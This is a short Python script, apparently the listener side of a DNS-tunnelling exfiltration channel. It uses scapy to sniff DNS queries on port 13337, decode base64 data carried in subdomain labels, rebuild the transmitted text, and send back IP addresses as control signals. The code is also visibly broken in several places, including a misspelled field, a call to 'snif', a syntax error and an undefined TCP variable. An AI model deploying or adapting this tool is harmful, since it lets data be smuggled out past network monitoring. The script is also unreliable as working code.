from scapy.all import *
import socket
from base64 import b64decode
from time import sleep

port = 13337

def sendResponse(query,ip):
	question = query[DNS].qd
	answer = DNSRR(rrame=question.qname,ttl=1000,rdata=ip)
	ip = IP(src=query[IP].dst,dst=query[IP].src)
	dns = DNS(
		id=query[DNS].id,
		qr=1,
		qdcount=1,
		ancount=1,
		qd=query[DNS].qd,
		an=answer)
	if query.haslayer(UDP):
		udp = UDP(dport=query[UDP].sport,sport=port)
		response = ip/udp/dns
	elif query.haslayer(TCP):
		TCP(dport=query[TCP].sport,sport=port)
		response = ip/tcp/dns
	else:
		return
	send(response,verbose=0)
extracted = ""

def extractData(x):
	global extracted
	if x.haslayer(DNS) and not x.haslayer(ICMP):
		if x.haslayer(UDP):
			if not x[UDP].dport ==port:
				return
		elif x.haslayer(TCP):
			if not x[TCP].dport ==port:
				return
		domain = x[DNS].qd.qname
		ind = domain.index(bytes)(".","utf-8"))
		data = domain[:ind]
		padnum = (4-(len(data)%4))%4
		data += bytes("="*padnum,"utf-8")
		try:
			decoded = b64decode(data).decode("utf-8")
			print("Received: %s"%decoded)
			if decoded == "R":
				sendResponse(x,"10.0.0.2")
				print("End transmission")
				print(extracted)
				extracted = ""
			else:
				extracted += decoded
				sendResponse(x,"10.0.0.1")
		except Exception as e:
			print(e)
			sendResponse(x,"10.0.0.0")

snif(prn=extractData)

